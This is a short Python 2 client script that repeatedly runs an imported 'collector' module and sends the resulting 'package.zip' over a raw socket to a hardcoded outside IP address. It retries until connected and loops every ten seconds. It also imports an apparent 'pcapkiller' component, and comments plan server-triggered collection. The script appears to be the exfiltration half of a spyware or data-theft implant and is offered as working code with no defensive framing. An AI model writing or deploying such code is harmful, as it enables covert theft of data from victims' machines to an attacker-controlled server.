#!/usr/bin/python

# TARGET IP:PORT    24.150.80.188 : 3000

import socket
import sys
import time
import collector
# not yet implemented in this program
from tear import pcapkiller
#

def dispatch():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            # sock.connect(("localhost", 9999)) # for testing locally 
            sock.connect(('24.150.80.188', 3000))
            print '[+] Connected'
            break
        except socket.error:
            print '[-] Connection Refused - Retrying'
            time.sleep(5)

    print '[*] Opening file'
    f = open('package.zip', 'rb')
    l = f.read(1024)
    print '[*] Sending file'
    while(l):
        sock.send(l)
        l = f.read(1024)

    f.close()
    sock.close()
    print '[*] SUCCESS'
    print '[*] Connection closed'

if __name__ == "__main__":
    collector.execute()
    dispatch()
    
    # NOTE: need to modify to watch for certain messages(signals) sent from the server
    #       (ex. server sends REFRESH, client execute()'s and sends data)
    #       
    #       So the should be a constant connection between client and server or fork 
	#		another process that waits for incoming connections and when it recieves
	#		a Message from the server. It will send a signal to this process
    while True:
        #time.sleep(300)
        time.sleep(10)
        print 'collecting...'
        collector.execute()
        print 'sending...'
        dispatch()
